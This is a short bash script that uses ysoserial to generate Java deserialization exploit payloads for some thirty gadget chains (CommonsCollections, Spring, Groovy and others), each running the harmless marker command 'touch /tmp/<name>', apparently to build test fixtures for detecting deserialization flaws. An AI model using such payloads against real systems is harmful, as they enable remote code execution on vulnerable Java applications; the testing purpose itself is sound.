#!/bin/bash
PAYLOAD_LIST="BeanShell1 C3P0 Clojure CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 FileUpload1 Groovy1 Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JRMPListener JSON1 JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 Spring2 URLDNS Vaadin1 Wicket1"
for payload in $PAYLOAD_LIST;do
    command="touch /tmp/$payload"
    filename="data/${payload}.bin"
    echo "-- Generating payload file $filename"
    java -jar ysoserial.jar $payload "$command"> "$filename"
done